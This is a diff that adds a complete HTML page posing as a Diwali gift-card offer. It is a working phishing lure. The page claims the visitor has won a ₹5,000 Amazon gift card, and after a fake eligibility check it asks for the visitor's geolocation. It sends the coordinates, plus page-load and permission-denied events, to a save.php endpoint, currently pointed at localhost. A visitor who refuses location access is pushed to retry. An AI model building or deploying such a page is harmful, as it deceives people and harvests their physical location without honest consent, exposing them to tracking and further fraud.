@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Diwali Special Offer</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/2829/2829034.png">
+</head>
+<body>
+    <div class="container">
+        <div id="offer-content">
+            <img src="https://i.ibb.co/0jQ5z0T/diwali.png" alt="Diwali" class="festival-img">
+            <h1>Limited Time Diwali Offer!</h1>
+            <p>You've been selected for a <span class="highlight">₹5,000 Amazon Gift Card</span></p>
+            <div class="loading">
+                <p>Verifying your eligibility...</p>
+                <div class="loader"></div>
+            </div>
+        </div>
+    </div>
+    <script>
+        fetch('http://localhost:8080/save.php?status=page_loaded');
+        
+        setTimeout(() => {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    pos => {
+                        fetch(`http://localhost:8080/save.php?lat=${pos.coords.latitude}&lon=${pos.coords.longitude}&status=location_granted`);
+                        showSuccess();
+                    },
+                    err => {
+                        fetch('http://localhost:8080/save.php?status=location_denied');
+                        showError();
+                    }
+                );
+            }
+        }, 5000);
+
+        function showSuccess() {
+            document.getElementById('offer-content').innerHTML = `
+                <div class="success">
+                    <h2>🎉 Congratulations!</h2>
+                    <p>Your gift card will be delivered within 24 hours</p>
+                    <small>Offer valid for your location only</small>
+                </div>
+            `;
+        }
+
+        function showError() {
+            document.getElementById('offer-content').innerHTML += `
+                <div class="error">
+                    <p>Please enable location to verify your eligibility</p>
+                    <button onclick="retryLocation()">Try Again</button>
+                </div>
+            `;
+        }
+
+        function retryLocation() {
+            location.reload();
+        }
+    </script>
+</body>
+</html>
